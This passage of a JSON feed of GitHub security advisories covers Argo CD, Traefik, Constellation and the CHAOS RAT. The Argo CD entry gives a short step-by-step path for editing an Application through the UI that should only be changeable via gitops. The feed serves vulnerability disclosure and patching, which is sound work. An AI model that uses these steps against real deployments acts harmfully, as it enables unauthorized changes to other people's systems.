href=\"https://github.com/argoproj/argo-cd/commit/c5a252c4cc260e240e2074794aedb861d07e9ca5\">https://github.com/argoproj/argo-cd/commit/c5a252c4cc260e240e2074794aedb861d07e9ca5</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/e0ff56d89fbd7d066e9c862b30337f6520f13f17\">https://github.com/argoproj/argo-cd/commit/e0ff56d89fbd7d066e9c862b30337f6520f13f17</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2gvw-w6fj-7m3c\">https://github.com/advisories/GHSA-2gvw-w6fj-7m3c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2gvw-w6fj-7m3c",
            "title": "[github.com/argoproj/argo-cd/v2] Argo CD's API server does not enforce project sourceNamespaces",
            "date_modified": "2024-04-15T20:20:51.000Z",
            "date_published": "2024-04-15T20:20:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2gvw-w6fj-7m3c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>I can convince the UI to let me do things with an invalid Application.</p>\n<ol>\n<li>Admin gives me <code>p, michael, applications, *, demo/*, allow</code>, where <code>demo</code> can just deploy to the <code>demo</code> namespace</li>\n<li>Admin gives me AppProject <code>dev</code> which reconciles from ns <code>dev-apps</code></li>\n<li>Admin gives me <code>p, michael, applications, sync, dev/*, allow</code>, i.e. no updating via the UI allowed, gitops-only</li>\n<li>I create an Application called <code>pwn</code> in <code>dev-apps</code> with project dev and sync the app with sources from git</li>\n<li>I change the Application’s project to demo via kubectl or gitops (whichever mechanism my admins have given me, because it should be safe)</li>\n<li>I use the UI to edit the resource which should only be mutable via gitops</li>\n</ol>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.10.7 \nv2.9.12 \nv2.8.16</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by @crenshaw-dev (Michael Crenshaw)</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-2gvw-w6fj-7m3c\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2gvw-w6fj-7m3c</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/c514105af739eebedb9dbe89d8a6dd8dfc30bb2c\">https://github.com/argoproj/argo-cd/commit/c514105af739eebedb9dbe89d8a6dd8dfc30bb2c</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/c5a252c4cc260e240e2074794aedb861d07e9ca5\">https://github.com/argoproj/argo-cd/commit/c5a252c4cc260e240e2074794aedb861d07e9ca5</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/e0ff56d89fbd7d066e9c862b30337f6520f13f17\">https://github.com/argoproj/argo-cd/commit/e0ff56d89fbd7d066e9c862b30337f6520f13f17</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2gvw-w6fj-7m3c\">https://github.com/advisories/GHSA-2gvw-w6fj-7m3c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2gvw-w6fj-7m3c",
            "title": "[github.com/argoproj/argo-cd/v2] Argo CD's API server does not enforce project sourceNamespaces",
            "date_modified": "2024-04-15T20:20:51.000Z",
            "date_published": "2024-04-15T20:20:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2gvw-w6fj-7m3c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a potential vulnerability in Traefik managing HTTP/2 connections.</p>\n<p>More details in the <a href=\"https://www.cve.org/CVERecord?id=CVE-2023-45288\">CVE-2023-45288</a>.</p>\n<h2 id=\"patches\">Patches</h2>\n<ul>\n<li><a href=\"https://github.com/traefik/traefik/releases/tag/v2.11.2\">https://github.com/traefik/traefik/releases/tag/v2.11.2</a></li>\n<li><a href=\"https://github.com/traefik/traefik/releases/tag/v3.0.0-rc5\">https://github.com/traefik/traefik/releases/tag/v3.0.0-rc5</a></li>\n</ul>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>No workaround</p>\n<h2 id=\"for-more-information\">For more information</h2>\n<p>If you have any questions or comments about this advisory, please <a href=\"https://github.com/traefik/traefik/issues\">open an issue</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/traefik/traefik/security/advisories/GHSA-7f4j-64p6-5h5v\">https://github.com/traefik/traefik/security/advisories/GHSA-7f4j-64p6-5h5v</a></li>\n<li><a href=\"https://github.com/traefik/traefik/releases/tag/v2.11.2\">https://github.com/traefik/traefik/releases/tag/v2.11.2</a></li>\n<li><a href=\"https://github.com/traefik/traefik/releases/tag/v3.0.0-rc5\">https://github.com/traefik/traefik/releases/tag/v3.0.0-rc5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7f4j-64p6-5h5v\">https://github.com/advisories/GHSA-7f4j-64p6-5h5v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7f4j-64p6-5h5v",
            "title": "[github.com/traefik/traefik/v3] Traefik affected by HTTP/2 CONTINUATION flood in net/http",
            "date_modified": "2024-04-15T18:14:52.000Z",
            "date_published": "2024-04-15T18:14:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7f4j-64p6-5h5v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a potential vulnerability in Traefik managing HTTP/2 connections.</p>\n<p>More details in the <a href=\"https://www.cve.org/CVERecord?id=CVE-2023-45288\">CVE-2023-45288</a>.</p>\n<h2 id=\"patches\">Patches</h2>\n<ul>\n<li><a href=\"https://github.com/traefik/traefik/releases/tag/v2.11.2\">https://github.com/traefik/traefik/releases/tag/v2.11.2</a></li>\n<li><a href=\"https://github.com/traefik/traefik/releases/tag/v3.0.0-rc5\">https://github.com/traefik/traefik/releases/tag/v3.0.0-rc5</a></li>\n</ul>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>No workaround</p>\n<h2 id=\"for-more-information\">For more information</h2>\n<p>If you have any questions or comments about this advisory, please <a href=\"https://github.com/traefik/traefik/issues\">open an issue</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/traefik/traefik/security/advisories/GHSA-7f4j-64p6-5h5v\">https://github.com/traefik/traefik/security/advisories/GHSA-7f4j-64p6-5h5v</a></li>\n<li><a href=\"https://github.com/traefik/traefik/releases/tag/v2.11.2\">https://github.com/traefik/traefik/releases/tag/v2.11.2</a></li>\n<li><a href=\"https://github.com/traefik/traefik/releases/tag/v3.0.0-rc5\">https://github.com/traefik/traefik/releases/tag/v3.0.0-rc5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7f4j-64p6-5h5v\">https://github.com/advisories/GHSA-7f4j-64p6-5h5v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7f4j-64p6-5h5v",
            "title": "[github.com/traefik/traefik/v2] Traefik affected by HTTP/2 CONTINUATION flood in net/http",
            "date_modified": "2024-04-15T18:14:52.000Z",
            "date_published": "2024-04-15T18:14:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7f4j-64p6-5h5v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Cilium allows outside actors (<code>world</code> entity) to directly access pods with their internal pod IP, even if they are not exposed explicitly (e.g. via <code>LoadBalancer</code>). A pod that does not authenticate clients and that does not exclude <code>world</code> traffic via network policy may leak sensitive data to an attacker <em>inside the cloud VPC</em>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue has been patched in <a href=\"https://github.com/edgelesssys/constellation/releases/tag/v2.16.3\">v2.16.3</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>This network policy excludes all <code>world</code> traffic. It mitigates the problem, but will also block all desired external traffic. If vulnerable pods are known, a policy can be crafted to only firewall those instead (see also <a href=\"https://docs.cilium.io/en/stable/security/policy/language/#access-to-from-outside-cluster\">https://docs.cilium.io/en/stable/security/policy/language/#access-to-from-outside-cluster</a>).</p>\n<pre><code class=\"language-yaml\">apiVersion: \"cilium.io/v2\"\nkind: CiliumClusterwideNetworkPolicy\nmetadata:\n  name: \"from-world-to-role-public\"\nspec:\n  endpointSelector:\n    matchLabels: {}\n    #  role: public\n  ingressDeny:\n    - fromEntities:\n      - world\n</code></pre>\n<h3 id=\"references\">References</h3>\n<p>The tracking bug for a Cilium-side fix is <a href=\"https://github.com/cilium/cilium/issues/25626\">https://github.com/cilium/cilium/issues/25626</a>. </p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/edgelesssys/constellation/security/advisories/GHSA-g8fc-vrcg-8vjg\">https://github.com/edgelesssys/constellation/security/advisories/GHSA-g8fc-vrcg-8vjg</a></li>\n<li><a href=\"https://github.com/cilium/cilium/issues/25626\">https://github.com/cilium/cilium/issues/25626</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g8fc-vrcg-8vjg\">https://github.com/advisories/GHSA-g8fc-vrcg-8vjg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g8fc-vrcg-8vjg",
            "title": "[github.com/edgelesssys/constellation/v2] Constallation has pods exposed to peers in VPC",
            "date_modified": "2024-04-17T07:39:36.000Z",
            "date_published": "2024-04-15T18:13:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g8fc-vrcg-8vjg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in tiagorlampert CHAOS v5.0.1 allows a remote attacker to execute arbitrary code via the BuildClient function within client_service.go</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-30850\">https://nvd.nist.gov/vuln/detail/CVE-2024-30850</a></li>\n<li><a href=\"https://blog.chebuya.com/posts/remote-code-execution-on-chaos-rat-via-spoofed-agents\">https://blog.chebuya.com/posts/remote-code-execution-on-chaos-rat-via-spoofed-agents</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p3j6-f45h-hw5f\">https://github.com/advisories/GHSA-p3j6-f45h-hw5f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p3j6-f45h-hw5f",
            "title": "[github.com/tiagorlampert/CHAOS] tiagorlampert CHAOS vulnerable to command injections",
            "date_modified": "2024-04-12T21:23:31.000Z",
            "date_published": "2024-04-12T06:33:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p3j6-f45h-hw5f"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}